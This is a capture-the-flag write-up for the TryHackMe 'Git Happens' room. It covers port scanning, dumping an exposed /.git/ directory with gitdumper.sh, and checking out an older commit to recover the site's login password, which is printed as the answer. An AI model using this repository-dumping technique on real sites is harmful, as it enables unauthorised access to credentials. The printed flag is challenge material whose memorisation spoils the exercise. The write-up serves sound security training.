# Git Happens

## Overview

Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!

Room link: https://tryhackme.com/room/githappens
Difficulty: **Easy**
## Walkthrough

Scanning all ports only shows port 80 is open (HTTP):

```console
$ nmap -p- -T4 VICTIM_IP -oN scans/initial.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 16:21 GMT
Nmap scan report for VICTIM_IP
Host is up (0.040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.38 seconds
```

Running a full scan against this port confirms it is running Ubuntu with version `1.14.0` of Nginx and finds a Git repository at `/.git/`.

```console
$ nmap -p 80 -A -T4 VICTIM_IP -oN scans/openports.nmap   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 16:22 GMT
Nmap scan report for VICTIM_IP
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   VICTIM_IP:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-title: Super Awesome Site!
|_http-server-header: nginx/1.14.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   31.42 ms 10.9.0.1
2   31.52 ms VICTIM_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```

Navigating to the website shows a login form:

![GitHappens - LoginForm](/images/githappens_loginform.png)

From our Nmap scan, recall that there is a `/.git/` directory which holds the structure of a GitHub repository:

![GitHappens - .git directory](/images/githappens_git_directory.png)

We can use [gitdumper.sh](https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh) from [GitTools](https://github.com/internetwache/GitTools) to dump the Git repository from the site:

```console
$ wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
$ chmod +x gitdumper.sh
$ ./gitdumper.sh http://VICTIM_IP/.git/ .
```

![GitHappens - gitdumper.sh](/images/githappens_gitdumper.png)

We now have a `.git/` folder downloaded to our attacker machine. With this, we can run `git log` to show the commit logs. From the log, we can see a security change was made to obfuscate the code at commit `e56eaa8e29b589976f33d76bc58a0c4dfb9315b1`.

```console
$ git log
```

![GitHappens - Commit Log](/images/githappens_commitlog.png)

As such, we can run `git checkout` to load the previous commit `395e087334d613d5e423cdf8f7be27196a360459` and view the deobfuscated code.

```console
$ git checkout 395e087334d613d5e423cdf8f7be27196a360459
```

We can view the `index.html` file to view the **Super Secret Password**:

![GitHappens - Admin Credentials](/images/githappens_admin_credentials.png)

-----

1. Find the Super Secret Password.

```
Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!
```